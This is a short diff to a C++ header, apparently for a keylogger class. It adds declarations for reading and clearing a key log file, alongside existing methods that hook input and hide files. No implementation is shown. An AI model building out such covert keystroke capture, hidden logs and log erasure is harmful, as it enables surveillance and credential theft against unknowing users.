@@ -15,6 +15,12 @@ public:
     // Stops the hook and exits the message loop
     void stop();
 
+    // Reads and returns the contents of the key log file
+    std::string getLoggedData();
+
+    // Clears/erases the contents of the key log file
+    void clearLogFile();
+
     static void hideFile(const std::string& filename);
 
     // Unhide a file (reset attributes to Normal)
